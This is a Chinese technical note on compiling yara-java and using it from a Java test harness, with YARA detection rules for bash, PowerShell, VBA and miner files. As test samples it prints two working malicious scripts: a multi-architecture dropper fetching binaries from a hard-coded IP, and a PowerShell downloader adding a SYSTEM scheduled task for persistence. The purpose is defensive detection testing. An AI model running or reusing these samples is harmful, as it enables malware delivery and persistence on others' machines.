## yara

```
因为yara (https://yara.readthedocs.io/en/stable/index.html) 官方没有提供java的api，只有C和Python的api. 所以java代码中使用yara只能引入第三方的api
使用第三方的api（https://github.com/p8a/yara-java/tree/master）需要进行编译， 下面记录编译步骤和遇到的一些问题（环境是centos7）

1.下载yara-java和yara的代码， 并解压到/opt/yara目录
下载zip包， 下载地址是 https://github.com/p8a/yara-java/tree/master   ， https://github.com/virustotal/yara/tree/v3.10.0
注意： 先解压yara-3.10.0， 然后再将yara-java-master解压并放入yara-3.10.0目录中

2.编译yara
编译yara步骤如下

cd /opt/yara/yara-3.10.0
./bootstrap.sh
./configure --without-crypto --disable-shared CFLAGS=-fPIC
make

说明：--without-crypto参数表示不依赖OpenSSL library。 如果不加这个参数，使用yara-java的时候可能会报这样的错（在centos8环境下使用时，提示libcrypto.so.10缺失错误）


3. 打包yara-java
cd /opt/yara/yara-3.10.0/yara-java-master
mvn clean install
# 打出包： libyara-3.10.0-SNAPSHOT.jar， libyara-3.10.0-SNAPSHOT-linux64.jar
libyara-3.10.0-SNAPSHOT.jar  提供api接口 （接口的使用参考github项目（https://github.com/p8a/yara-java/tree/master）的单元测试 ）
libyara-3.10.0-SNAPSHOT-linux64.jar  提供so库
```



```java
import com.github.plusvic.yara.*;
import com.github.plusvic.yara.embedded.YaraImpl;

import java.io.File;
import java.util.*;

public class TestYaraFile {

    public static void main(String[] args) throws Exception {
        System.out.println("=====准备加载yara=====");
        YaraImpl yara = new YaraImpl();
        System.out.println("=====成功加载yara=====");

        YaraCompilationCallback compileCallback = new YaraCompilationCallback() {
            @Override
            public void onError(ErrorLevel errorLevel, String fileName, long lineNumber, String message) {
                System.out.println("====***********失败**************====");
                System.out.println(message);
                System.out.println(fileName);
                System.out.println(errorLevel);
                System.out.println(lineNumber);
            }
        };
		
		// 之前为了测试scan是同步的还是异步的， for循环10万次。不测试时设置为 i < 1
        for (int i = 0; i < 1; i++) { 
            List<String> matchedRules = new ArrayList<>();
            YaraScanCallback scanCallback = new YaraScanCallback() {
                @Override
                public void onMatch(YaraRule v) {
                    // 打印rule
//                System.out.println("rule: " + v.getIdentifier());
                    matchedRules.add(v.getIdentifier());

                    // 匹配到的字符串
//                printString(v.getStrings());

                    // 打印meta
                    Map<String, Object> metaDataMap = getMetaDataMap2(v.getMetadata());
                    Object desc = metaDataMap.getOrDefault("desc", "");
//                System.out.println("desc: " + desc.toString());
                    Object score = metaDataMap.getOrDefault("score", "");
//                System.out.println("score: " + score.toString());

                    // 打印tag
                    List<String> tags = new ArrayList<>();
                    Iterator<String> tagIterator = v.getTags();
                    while (tagIterator.hasNext()) {
                        tags.add(tagIterator.next());
                    }
//                System.out.println("tags: " + tags);
//                System.out.println();

                /*StackTraceElement[] stackElements = Thread.currentThread().getStackTrace();
                for (StackTraceElement stackElement : stackElements) {
                    System.out.print(stackElement.getClassName() + "/t");
                    System.out.print(stackElement.getFileName() + "/t");
                    System.out.print(stackElement.getLineNumber() + "/t");
                    System.out.println(stackElement.getMethodName());
                }*/
                }
            };

            try (YaraCompiler compiler = yara.createCompiler()) {
                System.out.println("=====编译规则=====");
                compiler.setCallback(compileCallback);
                compiler.addRulesFile("/root/hwj/project/malicious/rule_file_bash.yar", "/root/hwj/project/malicious/rule_file_bash.yar", null);
                compiler.addRulesFile("/root/hwj/project/malicious/rule_file_miner_config.yar", "rule_file_miner_config.yar", null);
                compiler.addRulesFile("/root/hwj/project/malicious/rule_file_powershell.yar", "rule_file_powershell.yar", null);
                compiler.addRulesFile("/root/hwj/project/malicious/rule_file_vba.yar", null, null);

                try (YaraScanner scanner = compiler.createScanner()) {
                    scanner.setCallback(scanCallback);
                    System.out.println("=====扫描 curl.txt================================================");
                    scanner.scan(new File("/root/hwj/project/malicious/curl.txt"));
                    System.out.println();
                    System.out.println("=====扫描 power.txt================================================");
                    scanner.scan(new File("/root/hwj/project/malicious/power.txt"));
                }
            }

            System.out.println(i + " -- Matched rules: " + matchedRules
```

curl.txt

```
#!/bin/sh

n="arm arm5 arm6 arm7 m68k mips mpsl ppc sh4 x86_64"
http_server="179.43.175.83"

for a in $n
do
    cp /system/bin/sh $a
    >$a
    curl http://$http_server/$a > $a
    chmod 777 $a
    ./$a adbscan
done

for a in $n
do
    rm $a
done
```

power.txt

```
$client = new-object System.Net.WebClient
$client.DownloadFile('http://155.94.228.223/upsupx2.exe','c:\windows\temp\conhoy.exe')
schtasks /run /tn oka
cmd /c taskkill /f /im conhoy.exe
cmd /c icacls c:\windows\temp\*.exe /reset
cmd /c schtasks /create /tn "MicrosoftsWindowsy" /tr "c:\windows\temp\conhoy.exe" /ru "system" /sc minute /mo 8 /f
cmd /c taskkill /f /im powershell.exe

```

rule_file_miner_config.yar

```shell
/*
    规则维护说明：

        1. 规则尽量新增，如改动原有规则必须将日期作者同时更新，便于问题追溯

        2. meta中的desc字段为<必备字段>，该字段必须说明规则所匹配的内容、影响及危害。

        3. meta中的rule_id为<可选字段>，该字段含义为安全事件id，若提供，则生成对应的
        安全事件，若不提供，则不生成安全事件（用于控制是否为灰度发布）

        4. meta中的score字段为<必备字段>，该字段表明该规则的可信度，分值为0-10，分值
        越高表明规则可信度越高（即规则越强表征事件越具体），该值为后续安全事件举证的
        依据，请根据所定规则酌情分配！

*/

rule Miner_conf_1: Miner
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 7 //置信度分值，值越高表示可信度越高
        desc = "该文件疑似为挖矿配置文件"
        desc_en = "This is suspected to be a mining configuration file."
    strings:
        $1 = "pools" fullword
        $2 = "max-cpu-usage"
        $3 = "log-file"
        $4 = "threads"
        $5 = "cpu-affinity"
        $6 = "background"
    condition:
        all of them and filesize < 5KB
}

rule Miner_conf_2: Miner
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 6 //置信度分值，值越高表示可信度越高
        desc = "该文件疑似为挖矿配置文件"
        desc_en = "This is suspected to be a mining configuration file."
    strings:
        $1 = "algo" fullword
        $2 = "cryptonight"
    condition:
        all of them and filesize < 5KB
}

rule Miner_conf_3: Miner
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 6 //置信度分值，值越高表示可信度越高
        desc = "该文件疑似为挖矿配置文件"
        desc_en = "This is suspected to be a mining configuration file."
    strings:
        $1 = "stratum" fullword
        $2 = "url"
        $3 = "user"
        $4 = "pass"
    condition:
        all of them and filesize < 3KB
}
```



rule_file_vba.yar

```
/*
    规则维护说明：

        1. 规则尽量新增，如改动原有规则必须将日期作者同时更新，便于问题追溯

        2. meta中的desc字段为<必备字段>，该字段必须说明规则所匹配的内容、影响及危害。

        3. meta中的rule_id为<可选字段>，该字段含义为安全事件id，若提供，则生成对应的
        安全事件，若不提供，则不生成安全事件（用于控制是否为灰度发布）

        4. meta中的score字段为<必备字段>，该字段表明该规则的可信度，分值为0-10，分值
        越高表明规则可信度越高（即规则越强表征事件越具体），该值为后续安全事件举证的
        依据，请根据所定规则酌情分配！

    本规则组用于扫描office文档中的恶意宏文本

*/

// 1. 包含宏脚本
rule VBA_Suspect: VBA
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 2 //置信度分值，值越高表示可信度越高
        desc = "该文档包含宏脚本"
        desc_en = "The file contained macro script."
    strings:
        $1 = "Attribute" nocase fullword
        $2 = "Sub" nocase fullword
        $3 = "dim" nocase fullword
        $4 = "VB_" nocase
    condition:
        any of them
}

// 2. 创建了对象
rule VBA_Object: VBA CreateObject
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 5 //置信度分值，值越高表示可信度越高
        desc = "该文档包含可疑宏脚本，存在对象创建行为"
        desc_en = "The file contained suspicious macro script and created objects."
    strings:
        $1 = "CreateObject" nocase fullword
    condition:
        $1 and VBA_Suspect
}

// 3. 存在shell操作
rule VBA_Shell: VBA Shell
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 6 //置信度分值，值越高表示可信度越高
        desc = "该文档包含可疑的宏脚本，宏脚本创建了shell执行环境"
        desc_en = "The file contained suspicious macro script which created the environment to execute shell."
    strings:
        $1 = "WScript.Shell" nocase fullword
        $3 = "cmd.exe" nocase
        $4 = "shell" nocase fullword
    condition:
        ($1 and VBA_Object)  or ($3 and $4)
}

// 4. 存在混淆行为
rule VBA_Obfuscated: VBA Obfuscated
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 5 //置信度分值，值越高表示可信度越高
        desc = "该文档包含可疑的宏脚本，宏脚本存在代码混淆行为"
        desc_en = "The file contained suspicious macro script with obfuscated codes."
    strings:
        $k1 = "chr" nocase fullword
        $k2 = "chrw" nocase fullword
        $k3 = "Base64" nocase
        $k4 = "ChrB" nocase fullword
        $k5 = "StrReverse" nocase fullword
        $k6 = "hex" nocase fullword
        $k7 = "cstr" nocase fullword
        $k8 = "CSng" nocase fullword
        $k9 = "Replace" nocase fullword
        $k10 = "Format" nocase fullword
        $k11 = "CByte" nocase fullword
    condition:
        2 of ($k*)
}

// 5. 存在注册表操作行为
rule VBA_Reg: VBA Reg
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 4 //置信度分值，值越高表示可信度越高
        desc = "该文档包含可疑的宏脚本，宏脚本存在注册表操作行为"
        desc_en = "The file contained suspicious macro script which created registry."
    strings:
        $1 = "RegRead" nocase fullword
        $2 = "HKEY_" nocase
    condition:
        ($1 or $2) and VBA_Suspect
}

// 6. 存在自动执行行为
rule VBA_AutoOpen: VBA AutoOpen
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 5 //置信度分值，值越高表示可信度越高
        desc = "该文档包含可疑宏脚本，打开文件后会自动执行宏脚本"
        desc_en = "The file contained suspicious macro script which could be automatically executed after the file was opened."
    strings:
        $1 = "AutoOpen()" nocase fullword
        $2 = "Workbook_Open()" nocase
        $3 = "Document_Open()" nocase
        $4 = "AutoExec()" nocase
    condition:
        any of them
}

// 7. 存在文件操作行为
rule VBA_File: VBA
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 5 //置信度分值，值越高表示可信度越高
        desc = "该文档包含可疑宏脚本，存在文件操作行为"
        desc_en = "The file contained suspicious macro script with operations on files."
    strings:
        $1 = "FileSystemObject" nocase fullword
        $2 = "CreateTextFile" nocase
    condition:
        ($1 and VBA_Object) or $2
}

// 8-1. 存在Downloader行为
rule VBA_URL: VBA URL
{
    meta:
        author = "yyh"
        date = "2019-10-22"
        score = 3
        desc = "该文档包含宏脚本，脚本中存在url"
        desc_en = "The file contained macro script with URL."
    strings:
        $url = /https?:\/\/([\w\.-]+)([\/\w \.-]*)/
    condition:
        all of them
}


// 8. 存在Downloader行为
rule VBA_Downloader: VBA Downloader
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 7
        desc = "该文档包含可疑宏脚本，存在远程文件下载的风险"
        desc_en = "The file contained suspicious macro script at risk of downloading remote files."
    strings:
        $createobject = "createobject" nocase fullword
        $xmlhttp = "XMLHTTP" nocase
    condition:
        all of them and VBA_URL
}

// 9. 存在垃圾邮件发送行为
rule VBA_Sendmail: VBA Sendmail
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 4
        desc = "该文档包含可疑宏脚本，存在大规模对外发送垃圾邮件的风险"
        desc_en = "The file contained suspicious macro script at risk of sending a large number of spams to external addresses."
    strings:
        $1 = "Massive_SendMail" nocase
        $2 = "Outlook.Application" nocase
        $3 = "SendEmail" nocase

    condition:
        $1 or ($2 and $3)
}

// 10. 存在WMI命令操作行为
rule VBA: VBA WMI
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 5
        desc = "该文档包含可疑宏脚本，存在WMI命令操作的风险"
        desc_en = "The file contained suspicious macro script at risk of executing WMI commands."
    strings:
        $1 = "WinMgmts" nocase
        $2 = "Win32_Process" nocase

    condition:
        $1 and $2 and VBA_Suspect
}

// 10. 存在键盘指令操作行为
rule VBA_Keyboard: VBA KeyBoard
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 4
        desc = "该文档包含可疑宏脚本，存在模拟键盘指令操作的风险"
        desc_en = "The file contained suspicious macro script at risk of simulating keyboard operations."
    strings:
        $1 = "SendKeys" nocase

    condition:
        $1 and VBA_Suspect
}

// 11. 存在执行混淆代码的恶意行为
rule VBA_Obfuscated_Shell: VBA Obfuscated Shell
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 7
        desc = "该文档包含可疑宏脚本，存在执行混淆的shell代码的风险"
        desc_en = "The file contained suspicious macro script at risk of having shell codes to execute obfuscation."

    condition:
        VBA_Obfuscated and VBA_Shell
}

// 12. 存在自动执行混淆代码的恶意行为
rule VBA_Obfuscated_AutoOpen: VBA Obfuscated AutoOpen
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 6
        desc = "该文档包含可疑宏脚本，存在自动执行混淆代码的风险"
        desc_en = "The file contained suspicious macro script at risk of automatically executing obfuscated codes."

    condition:
        VBA_Obfuscated and VBA_AutoOpen
}

// 12. 存在自动执行混淆代码的恶意行为
rule VBA_Obfuscated_AutoRun: VBA Obfuscated AutoOpen
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 7
        desc = "该文档包含可疑宏脚本，存在自动执行并创建shell环境的风险"
        desc_en = "The file contained suspicious macro script at risk of auto execution and shell environment creation."

    condition:
        VBA_Obfuscated and VBA_AutoOpen and VBA_Shell
}

// 13. 存在VBA中自动调用powershell的行为
rule VBA_Powershell: VBA Powershell
{
    meta:
        author = "yyh"
        date = "2019-10-23"
        score = 8
        desc = "该文档包含可疑宏脚本，存在Powershell调用执行的风险"
        desc_en = "The file contained suspicious macro script at risk of calling Powershell."

    strings:
        $k1 = "powershell" nocase

    condition:
        $k1 and VBA_AutoOpen and VBA_Suspect
}

// 14. 创建了shell并执行可疑代码
rule VBA_Shell_Run: VBA Run Shell
{
    meta:
        author = "yyh"
        date = "2019-10-17"
        score = 9
        desc = "该文档包含可疑宏脚本，创建了Shell并执行可疑代码，可能为鱼叉邮件攻击"
        desc_en = "The file contained suspicious macro script. Shell was created and suspicious codes were executed. This was suspected to be spear phishing."

    strings:
        $k1 = "wscript.shell" nocase
        $k2 = "createobject" nocase fullword
        $k3 = "Run" nocase

    condition:
        all of ($k*) and VBA_AutoOpen

```



rule_file_bash.yar

```
/*
    规则维护说明：

        1. 规则尽量新增，如改动原有规则必须将日期作者同时更新，便于问题追溯

        2. meta中的desc为<必备字段>，该字段必须说明规则所匹配的内容、影响及危害。

        3. meta中的score为<必备字段>，该字段表明该规则的可信度，分值为0-10，分值
        越高表明规则可信度越高，该值为后续安全事件举证的依据，分值为0表示该规则不会
        生成安全事件，可用于灰度发布控制，请根据所定规则酌情分配！

    本规则组用于对linux bash脚本进行扫描

*/


rule SH_Suspect: Bash
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 2 //置信度分值，值越高表示可信度越高，shell基础分设置为2分
        desc = "该脚本疑似为Linux shell脚本"
        desc_en = "This is suspected to be a Linux shell script"
    strings:
        $sh1 = "/bin/bash"
        $sh2 = "/bin/sh"
        $sh3 = "/usr/bin/env sh"
        $sh4 = "/usr/bin/env bash"
    condition:
        1 of ($sh*)
}

rule SH_Downloader: Bash Downloader
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 3
        desc = "该脚本疑似为Linux Shell Downloader脚本"
        desc_en = "This is suspected to be a Linux Shell Downloader script"
    strings:
        $download_cmd_1 = "curl" fullword
        $download_cmd_2 = "wget" fullword
    condition:
        1 of ($download_cmd_*) and SH_Suspect
}

rule SH_Downloader_dir: Bash Downloader
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 6
        desc = "该脚本疑似为Linux Shell脚本，存在敏感操作行为"
        desc_en = "The script was suspected to be a Linux shell script with sensitive operations."
    strings:
        $a1 = "/tmp/"
        $a2 = "/dev/null" fullword
        $a3 = "rm -rf"
        $a4 = "history -c"
        $a5 = "netstat -"
        $a6 = "/etc/"
    condition:
        2 of ($a*) and SH_Suspect
}


rule SH_Downloader_URL: Bash Downloader
{
    meta:
        author = "peter"
        date = "2019-04-22"
        score = 5
        desc = "该脚本疑似为Linux Shell Downloader脚本"
        desc_en = "This is suspected to be a Linux Shell Downloader script"
    strings:
        $url = /https?:\/\/([\w\.-]+)([\/\w \.-]*)/
        $domain = /^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$/
        $ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/ wide ascii
    condition:
        ($url or $domain or $ip) and SH_Suspect
}

rule SH_Downloader_Kill: Bash Downloader Kill_Process
{
    meta:
        author = "peter"
        date = "2019-04-22"
        score = 4
        desc = "该脚本疑似为Linux Shell脚本, 存在杀死某个进程的危险操作"
        desc_en = "This is suspected to be a Linux Shell script, and there is a dangerous operation that kills a process"
    strings:
        $ps = "ps" fullword
        $grep = "grep" fullword
        $pkill = "pkill" fullword
        $kill_force = "kill"
    condition:
        ($ps and $grep) and ($pkill or $kill_force) and SH_Suspect
}

rule SH_Downloader_Base64: Bash base64
{
    meta:
        author = "peter"
        date = "2019-04-22"
        score = 8
        desc = "该脚本疑似为Linux Shell脚本, 存在执行base64编码混淆后的可疑代码"
        desc_en = "The script was suspected to be a Linux shell script with suspicious Base64-obfuscated codes."
    strings:
        $echo = "echo" fullword
        $base64 = "base64 -d" nocase
    condition:
        ($echo and $base64) and SH_Suspect
}

rule SH_Downloader_Exec: Bash Downloader Execution
{
    meta:
        author = "peter"
        date = "2019-04-22"
        score = 6
        desc = "该脚本疑似为Linux Shell Downloader脚本, 会拉取远程代码并执行"
        desc_en = "This is suspected to be a Linux Shell Downloader script which will download and execute remote code"
    strings:
        $chmod = "chmod" fullword
        $nohup = "nohup" fullword
    condition:
        ($chmod or $nohup) and SH_Downloader_URL
}

rule SH_Downloader_Crontab: Bash Downloader Crontab
{
    meta:
        author = "peter"
        date = "2019-04-22"
        score = 7
        desc = "该脚本疑似为Linux Shell Downloader脚本，会拉取远程代码并执行，并写入定时任务保活"
        desc_en = "This is suspected to be a Linux Shell Downloader script which will download and execute remote code and write scheduled task for keeping virus alive"
    strings:
        $crontab = "crontab" fullword
    condition:
        $crontab and SH_Downloader_Exec
}

rule SH_Downloader_ssh: Bash Downloader ssh
{
    meta:
        author = "peter"
        date = "2019-04-22"
        score = 7
        desc = "该脚本疑似为Linux Shell脚本，可能存在ssh账号暴破行为"
        desc_en = "The script was suspected to be a Linux Shell script and launch SSH brute-force attack."
    strings:
        $ssh1 = "/.ssh/know_hosts"
        $ssh2 = "/.ssh/id_rsa.pub"
        $ssh3 = "msscan" fullword
    condition:
        1 of ($ssh*) and SH_Downloader_URL
}

rule SH_Downloader_DDGMiner: Bash Downloader Miner
{
    meta:
        author = "peter"
        date = "2019-04-22"
        score = 8
        rule_id = 160002
        desc = "该脚本疑似为Linux平台DDG团伙挖矿脚本，会从远程拉取挖矿病毒并执行挖矿任务，有看门狗保活机制"
        desc_en = "This is suspected to be a DDG gang mining script on Linux. It will download mining virus remotely and perform mining tasks. It uses watchdog to keep virus alive"
    strings:
        $k1 = "miner_url" nocase
        $k2 = "watchdog_url" nocase
        $k3 = "crypto-pool" nocase

    condition:
        all of ($k*) and SH_Downloader_URL
}

```



rule_file_powershell.yar

```
/*
    规则维护说明：

        1. 规则尽量新增，如改动原有规则必须将日期作者同时更新，便于问题追溯

        2. meta中的desc为<必备字段>，该字段必须说明规则所匹配的内容、影响及危害。

        3. meta中的score为<必备字段>，该字段表明该规则的可信度，分值为0-10，分值
        越高表明规则可信度越高，该值为后续安全事件举证的依据，分值为0表示该规则不会
        生成安全事件，可用于灰度发布控制，请根据所定规则酌情分配！

    本规则组用于扫描powershell恶意文本文件

*/

// 1. 疑似为powershell脚本
rule PS_Suspect: Powershell
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 4 //置信度分值，值越高表示可信度越高，powershell基础分设置为5分
        desc = "该脚本疑似为Powershell脚本"
        desc_en = "This is suspected to be a Powershell script"
    strings:
        $1 = "new-object" nocase
        $2 = "powershell.exe" nocase
        $3 = "cmd.exe" nocase
        $4 = "powershell" nocase
    condition:
        $1 or $2 or ($3 and $4)
}

// 2. 包含策略绕过的Powershell脚本
rule PS_Bypass: Powershell Bypass
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 4
        desc = "该脚本为包含Windows运行策略绕过的Powershell脚本，可绕过系统策略限制执行恶意代码"
        desc_en = "This is a Powershell script that can bypass Windows running policy. It can bypass system policy restrictions to execute malicious code"
    strings:
        $bypass1 = "-ep bypass" nocase
        $bypass2 = "-nop" nocase fullword
        $bypass3 = "-executionpolicy" nocase
        $bypass4 = "-exec bypass" nocase
        $bypass5 = "-win hidden" nocase
        $bypass6 = "-windowstyle hidden" nocase
        $bypass7 = "-w hidden" nocase
        $bypass8 = "-NonI" nocase
        $bypass9 = "-NoProfile" nocase
        $bypass10 = "-NonInteractive" nocase
        $bypass11 = "-NoLogo" nocase
        $bypass12 = "-enc" nocase fullword
        $bypass13 = "-encodedcommand" nocase
    condition:
        1 of ($bypass*) and PS_Suspect
}

// 3. 包含编码混淆绕过的恶意powershell
rule PS_Obfuscated: Powershell Obfuscated
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 6
        desc = "该脚本为包含编码混淆绕过的Powershell脚本，编码混淆可躲避大部分杀毒软件特征码查杀，达到免杀目的"
        desc_en = "This is a Powershell script that contains code obfuscation to bypass virus scan. Code obfuscation can avoid scan and removal of most antivirus software"
    strings:
        $obfuscate1 = "IO.Compression" nocase
        $obfuscate2 = "FromBase64String" nocase
        $obfuscate3 = "IO.StreamReader" nocase
        $obfuscate4 = "IO.MemoryStream" nocase
        $obfuscate5 = "DeflateStream" nocase
        $obfuscate6 = "CompressionMode" nocase
        $obfuscate7 = "-encodedcommand" nocase
        $obfuscate8 = "GzipStream" nocase
    condition:
        2 of ($obfuscate*) and PS_Suspect
}

// 4. powershell 可疑代码执行
rule PS_CodeExecute: Powershell CodeExecute
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 6
        desc = "该脚本为包含代码执行的Powershell脚本，可能存在恶意代码执行的风险"
        desc_en = "This is a Powershell script that can execute code, which brings risk of malicious code execution"
    strings:
        $exe1 = "IEX" fullword nocase
        $exe2 = "invoke-item" nocase
        $exe3 = "invoke-expression" nocase
        $exe4 = "invoke-command" nocase
        $exe5 = "start-process" nocase
        $exe6 = "start-job" nocase
        $exe7 = "invoke-minikatz" nocase
    condition:
        1 of ($exe*) and PS_Suspect
}

// 5. 可疑的powershell下载行为
rule PS_Downloader_Normal: Powershell Downloader
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 6
        desc = "该脚本为可疑的Powershell Downloader脚本，可能通过HTTP从远程拉取病毒文件，具备一般的Downloader特征"
        desc_en = "This is a suspicious Powershell Downloader script that possibly downloads virus-infected file remotely through HTTP. It has general Downloader characteristics"
    strings:
        $download1 = "DownloadString" nocase
        $download2 = "DownloadFile" nocase
        $download3 = "Downloaddata" nocase
        $download4 = "Net.WebClient" nocase
    condition:
        1 of ($download*) and PS_Suspect
}

// 6. 包含url的powershell下载行为
rule PS_Downloader_URL: Powershell Downloader
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 7
        desc = "该脚本为可疑的Powershell Downloader脚本，通过HTTP从远程拉取病毒文件，包含可疑url，具备典型的Downloader特征"
        desc_en = "This is a suspicious Powershell Downloader script that downloads virus-infected file remotely through HTTP and contains suspicious URLs. It has general Downloader characteristics"
    strings:
        $url = /https?:\/\/([\w\.-]+)([\/\w \.-]*)/
    condition:
        $url and PS_Downloader_Normal
}

// 7. powershell downloader 可疑代码执行
rule PS_Downloader_CodeExecute: Powershell Downloader CodeExecute
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 7
        desc = "该脚本为可疑Powershell Downloader脚本, 会从远程服务器拉取恶意代码并执行"
        desc_en = "This is a suspicious Powershell Downloader script that will download and execute malicious code from a remote server"
    condition:
        PS_Downloader_Normal and PS_CodeExecute
}

// 8. powershell downloader 可疑代码执行，包含url
rule PS_Downloader_URL_CodeExecute: Powershell Downloader CodeExecute
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 8
        desc = "该脚本为恶意Powershell Downloader脚本, 会从远程服务器拉取恶意代码并执行，脚本中包含可疑url"
        desc_en = "This is a malicious Powershell Downloader script that will download and execute malicious code from a remote server. It contains suspicious URLs"
    condition:
        PS_Downloader_URL and PS_CodeExecute
}

// 8. powershell 执行编码混淆的代码
rule PS_Obfuscated_CodeExecute: Powershell Obfuscated CodeExecute
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 8
        desc = "该脚本包含编码混淆绕过的Powershell脚本，会执行混淆编码后的可疑代码，可绕过一般的杀毒软件检测"
        desc_en = "The script contains a Powershell script that contains code obfuscation to bypass virus scan. It will execute obfuscated suspicious code and can bypass ordinary antivirus software detection"
    condition:
        PS_Obfuscated and PS_CodeExecute
}

// 9. 通过VBS调用powershell的downloader 可疑代码执行，包含url
rule PS_VBS_Downloader_URL_CodeExecute: Powershell VBS Downloader CodeExecute
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 9
        desc = "该脚本为恶意VBS Downloader脚本, 通过VBS调用Powershell，会从远程服务器拉取恶意代码并执行，脚本中包含可疑url"
        desc_en = "This is a malicious VBS Downloader script, which calls Powershell through VBS and will download and execute malicious code from a remote server. The script contains suspicious URLs"
    strings:
        $wshell = "WScript.Shell" nocase
    condition:
        $wshell and PS_Downloader_URL_CodeExecute
}

// 10. powershell downloader 混淆代码执行
rule PS_Downloader_Obfuscated_CodeExecute: Powershell Downloader Obfuscated CodeExecute
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 9
        desc = "该脚本为包含编码混淆绕过的Powershell Downloader脚本，会从远程服务器拉取恶意代码并执行"
        desc_en = "The script contains a Powershell Downloader script that contains code obfuscation to bypass virus scan. It will download and execute malicious code from a remote server"
    condition:
        PS_Obfuscated and PS_Downloader_URL_CodeExecute
}

// 11. powershell downloader 无文件攻击
rule PS_Downloader_NonFileAttack: Powershell Downloader NonFileAttack
{
    meta:
        author = "yyh"
        date = "2019-04-22"
        score = 9
        desc = "该脚本为包含无文件攻击绕过的恶意Powershell Downloader脚本, 会从远程服务器拉取恶意代码并直接在内存中执行，全程无文件落盘以达到免杀效果"
        desc_en = "This script is a malicious Powershell Downloader script that uses fileless attack to bypass virus scan. It will download malicious code from the remote server and execute it directly in memory with no file stored in disk, to avoid virus scan and removal"
    strings:
        $downloadstring = "DownloadString" nocase
    condition:
        $downloadstring and PS_Downloader_CodeExecute
}
```



